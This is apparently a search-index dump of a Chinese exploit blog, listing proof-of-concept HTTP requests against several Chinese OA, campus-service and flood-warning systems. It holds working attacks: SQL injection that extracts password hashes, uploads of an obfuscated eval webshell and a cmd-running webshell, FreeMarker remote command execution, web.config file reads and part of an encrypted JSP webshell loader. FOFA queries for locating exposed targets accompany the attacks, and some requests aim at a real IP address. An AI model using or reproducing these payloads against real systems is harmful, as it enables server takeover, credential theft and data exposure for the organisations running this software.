信息泄露漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.asmx-getuserxml4geps-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: xxx.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 88 dasdas=\u0026key=1’ UNION ALL SELECT top 1812 concat(F_CODE,’:’,F_PWD_MD5) from T_ORG_USER – ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BEoa-configservice.asmx-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"广联达oa ConfigService.asmx GetIMDictionary sql注入漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BEoa-configservice.asmx-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1 Host: 10.10.10.1:8888 X-Requested-With: Ext.basex Accept: text/html, application/xhtml+xml, image/jxr, / Accept-Language: zh-Hans-CN,zh-Hans;q=0.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryFfJZ4PlAZBixjELj Accept: / Origin: http://10.10.10.1 Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512\u0026menuitemid=120743\u0026frame=1\u0026modulecode=GTP.Workflow.TaskCenterModule\u0026tabID=40 Cookie: Connection: close Content-Length: 421 ——WebKitFormBoundaryFfJZ4PlAZBixjELj Content-Disposition: form-data; filename=“1.aspx”;filename=“1.jpg” Content-Type: application/text \u003c%@ Page Language=“Jscript” Debug=true%\u003e \u003c% var FRWT=‘XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD’; var GFMA=Request.Form(“qmq1”); var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1); eval(GFMA, ONOQ); %\u003e ——WebKitFormBoundaryFfJZ4PlAZBixjELj– ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BEoa-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"广联达oa msgbroadcastuploadfile.aspx 后台文件上传漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BEoa-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"广联达oa sql注入漏洞 POC POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: xxx.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 88 dasdas=\u0026key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER -- ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"广联达oa sql注入漏洞 ","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"广联达oa 后台文件上传漏洞 POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1 Host: 10.10.10.1:8888 X-Requested-With: Ext.basex Accept: text/html, application/xhtml+xml, image/jxr, */* Accept-Language: zh-Hans-CN,zh-Hans;q=0.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj Accept: */* Origin: http://10.10.10.1 Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512\u0026menuitemid=120743\u0026frame=1\u0026modulecode=GTP.Workflow.TaskCenterModule\u0026tabID=40 Cookie: Connection: close Content-Length: 421 ------WebKitFormBoundaryFfJZ4PlAZBixjELj Content-Disposition: form-data; filename=\"1.aspx\";filename=\"1.jpg\" Content-Type: application/text \u003c%@ Page Language=\"Jscript\" Debug=true%\u003e \u003c% var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD'; var GFMA=Request.Form(\"qmq1\"); var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1); eval(GFMA, ONOQ); %\u003e ------WebKitFormBoundaryFfJZ4PlAZBixjELj-- ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BEoa-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"广联达oa 后台文件上传漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BEoa-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"万江港利\"\u0026\u0026body=\"山洪灾害\" ","date":"2023-12-08","objectID":"/%E6%88%90%E9%83%BD%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9-%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F-filehandler.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:0:0","tags":["2023hw"],"title":"成都万江港利科技有限公司 万江港利-山洪灾害预警系统 FileHandler.ashx 任意文件读取","uri":"/%E6%88%90%E9%83%BD%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9-%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F-filehandler.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw"],"content":"exp detail: ID: 4849 Author: Peanut Name: 万江港利-山洪灾害预警系统 任意文件读取漏洞(CVE-2023-4172) Description: 万江港利山洪灾害防治预警系统软件是对空间信息技术、计算机网络技术、现代通信技术进行无缝集成，结合灾害监测预警的业务需求，采用世界领先GIS地理信息处理技术、RS遥感技术、GPRS/CMDA/3G通讯技术、Microsoft Silverlight Web前端应用程式开发解决方案、以及大容量数据采集技术和大容量数据存储等计算机网络通信与数据处理技术，建立一个用户界面友好的、多终端的、可定制的、集数据采集、存储、分析于一体的综合地理信息平台。该系统存在任意文件读取漏洞，攻击者可获取大量敏感信息 Identifier: CVE: CVE-2023-4172 DVB: DVB-2023-4849 Cvss: Score: 4.3 Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N VulnClass: - 任意文件读取 Category: - 应用服务 Manufacturer: '成都万江港利科技有限公司 ' Product: 万江港利-山洪灾害预警系统 Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: '2023-08-05' Is0day: false IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"万江港利\"\u0026\u0026body=\"山洪灾害\" Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 session: true requests: - method: GET timeout: 10 path: /Service/FileHandler.ashx?Action=Download\u0026FileDirectory=E:/SCWJ/Official/Web/MFCW/\u0026FileName=web.config\u0026FileSourceName=web headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.927.108 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"\u003cconfiguration\u003e\") \u0026\u0026 body.contains(\"\u003cauthorization\u003e\")) ","date":"2023-12-08","objectID":"/%E6%88%90%E9%83%BD%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9-%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F-filehandler.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:1:0","tags":["2023hw"],"title":"成都万江港利科技有限公司 万江港利-山洪灾害预警系统 FileHandler.ashx 任意文件读取","uri":"/%E6%88%90%E9%83%BD%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9-%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F-filehandler.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"万江港利\"\u0026\u0026body=\"山洪灾害\" ","date":"2023-12-08","objectID":"/%E6%88%90%E9%83%BD%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9-%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F-upload.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"成都万江港利科技有限公司 万江港利-山洪灾害预警系统 upload.aspx任意文件上传漏洞","uri":"/%E6%88%90%E9%83%BD%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9-%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F-upload.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp detail: ID: 5004 Author: Peanut Name: 万江港利-山洪灾害预警系统 任意文件上传漏洞 Description: 万江港利山洪灾害防治预警系统软件是对空间信息技术、计算机网络技术、现代通信技术进行无缝集成，结合灾害监测预警的业务需求，采用世界领先GIS地理信息处理技术、RS遥感技术、GPRS/CMDA/3G通讯技术、Microsoft Silverlight Web前端应用程式开发解决方案、以及大容量数据采集技术和大容量数据存储等计算机网络通信与数据处理技术，建立一个用户界面友好的、多终端的、可定制的、集数据采集、存储、分析于一体的综合地理信息平台。成都万江港力科技有限公司-山洪灾害监测预警系统2.0存在严重的任意文件上传漏洞，可以未经授权获取服务器权限。 Identifier: DVB: DVB-2023-5004 VulnClass: - 任意文件上传 Category: - 应用服务 Manufacturer: '成都万江港利科技有限公司 ' Product: 万江港利-山洪灾害预警系统 Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: '2022-05-25' Is0day: false IncludeExp: true Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"万江港利\"\u0026\u0026body=\"山洪灾害\" Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 \u0026\u0026 req1 session: true requests: - method: POST timeout: 10 path: /App_Resource/UEditor/server/upload.aspx headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.927.108 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJa5U4zOAfmJDcYxj data: \"------WebKitFormBoundaryJa5U4zOAfmJDcYxj\\nContent-Disposition: form-data;\\ \\ name=\\\"file\\\"; filename=\\\"1.aspx\\\"\\nContent-Type: image/jpeg\\n\\n \u003c%@Page Language=\\\"\\ C#\\\"%\u003e\\n \u003c%\\n Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\\\"\\ ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\\\")));\\n System.IO.File.Delete(Request.PhysicalPath);\\n\\ \\ %\u003e\\n------WebKitFormBoundaryJa5U4zOAfmJDcYxj--\" follow_redirects: true matches: code.eq(\"200\") set_variables: - str1: strSplit(\"{{body}}\",\"Upload\",1) - str2: strSplit(\"{{str1}}\",\"aspx\",0) - method: GET timeout: 10 path: /Upload{{str2}}aspx headers: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.3161.139 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"e165421110ba03099a1c0393373c5b43\")) exp: relative: req0 \u0026\u0026 req1 session: true requests: - method: POST timeout: 10 path: /App_Resource/UEditor/server/upload.aspx headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.927.108 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJa5U4zOAfmJDcYxj data: \"------WebKitFormBoundaryJa5U4zOAfmJDcYxj\\nContent-Disposition: form-data;\\ \\ name=\\\"file\\\"; filename=\\\"1.aspx\\\"\\nContent-Type: image/jpeg\\n\\n\u003c%@ Page Language=\\\"\\ Jscript\\\" validateRequest=\\\"false\\\" %\u003e\\n\u003c%\\nvar c=new System.Diagnostics.ProcessStartInfo(\\\"\\ cmd\\\");\\nvar e=new System.Diagnostics.Process();\\nvar out:System.IO.StreamReader,EI:System.IO.StreamReader;\\n\\ c.UseShellExecute=false;\\nc.RedirectStandardOutput=true;\\nc.RedirectStandardError=true;\\n\\ e.StartInfo=c;\\nc.Arguments=\\\"/c \\\" + Request.Item[\\\"cmd\\\"];\\ne.Start();\\nout=e.StandardOutput;\\n\\ EI=e.StandardError;\\ne.Close();\\nResponse.Write(out.ReadToEnd() + EI.ReadToEnd());\\n\\ System.IO.File.Delete(Request.PhysicalPath);\\nResponse.End();\\n%\u003e\\n------WebKitFormBoundaryJa5U4zOAfmJDcYxj--\" follow_redirects: true matches: code.eq(\"200\") set_variables: - str1: strSplit(\"{{body}}\",\"Upload\",1) - str2: strSplit(\"{{str1}}\",\"aspx\",0) - method: GET timeout: 10 path: /Upload{{str2}}aspx?cmd={{command}} headers: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.3161.139 Safari/537.36 follow_redirects: true matches: code.eq(\"200\") result: '{{body}}' ","date":"2023-12-08","objectID":"/%E6%88%90%E9%83%BD%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9-%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F-upload.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"成都万江港利科技有限公司 万江港利-山洪灾害预警系统 upload.aspx任意文件上传漏洞","uri":"/%E6%88%90%E9%83%BD%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8-%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9-%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F-upload.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 新开普 前置服务管理平台 service.action 远程命令执行漏洞\r","date":"2023-12-08","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"新开普 前置服务管理平台 service.action 远程命令执行漏洞","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 新开普 前置服务管理平台 service.action 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"2023-12-08","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"新开普 前置服务管理平台 service.action 远程命令执行漏洞","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 新开普 前置服务管理平台 ","date":"2023-12-08","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"新开普 前置服务管理平台 service.action 远程命令执行漏洞","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 title=“掌上校园服务管理平台” ","date":"2023-12-08","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"新开普 前置服务管理平台 service.action 远程命令执行漏洞","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC POST /service_transport/service.action HTTP/1.1 Host: Accept: */* Content-Type: application/json {\"command\":\"GetFZinfo\",\"UnitCode\":\"\u003c#assign ex = \\\"freemarker.template.utility.Execute\\\"?new()\u003e${ex(\\\"cmd /c echo Test \u003e ./webapps/ROOT/Test.txt\\\")}\"} ","date":"2023-12-08","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"新开普 前置服务管理平台 service.action 远程命令执行漏洞","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"新开普掌上校园服务管理平台service.action远程命令执行 新开普掌上校园服务管理平台service.action接口处存在远程命令执行漏洞，攻击者可在未经身份认证的情况下，调用后台接口，执行恶意系统命令。 ","date":"2023-12-08","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE%E6%8E%8C%E4%B8%8A%E6%A0%A1%E5%9B%AD%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0service.action%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":["2023hw漏洞"],"title":"新开普掌上校园服务管理平台service.action远程命令执行","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE%E6%8E%8C%E4%B8%8A%E6%A0%A1%E5%9B%AD%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0service.action%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["2023hw漏洞"],"content":"POC POST /service_transport/service.action HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0 Connection: close Content-Length: 211 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4 Upgrade-Insecure-Requests: 1 { \"command\": \"GetFZinfo\", \"UnitCode\": \"\u003c#assign ex = \"freemarker.template.utility.Execute\" ?new()\u003e${ex(\"cmd /c echo 123 \u003e./webapps/ROOT/test.txt\")}\"} ","date":"2023-12-08","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE%E6%8E%8C%E4%B8%8A%E6%A0%A1%E5%9B%AD%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0service.action%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":["2023hw漏洞"],"title":"新开普掌上校园服务管理平台service.action远程命令执行","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE%E6%8E%8C%E4%B8%8A%E6%A0%A1%E5%9B%AD%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0service.action%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"企业流程化管控系统\" \u0026\u0026 body=\"密码(Password):\" ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-formservice-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统 formservice SQL 注入漏洞","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-formservice-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /formservice?service=workflow.sqlResult HTTP/1.1 Host: 106.14.45.41:8088 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3 Connection: keep-alive Content-Type: application/json Accept-Encoding: gzip Content-Length: 50 {\"params\": {\"a\": \"11\"}, \"sql\": \"select @@version\"} ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-formservice-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统 formservice SQL 注入漏洞","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-formservice-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"企业流程化管控系统\" \u0026\u0026 body=\"密码(Password):\" ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-formservice-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统 formservice 文件上传漏洞","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-formservice-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /formservice?service=attachment.write\u0026isattach=false\u0026filename=C4fD6D7DCb9B199a.jsp HTTP/1.1 Host: 106.14.45.41:8102 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip Content-Length: 533 \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u003c%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher 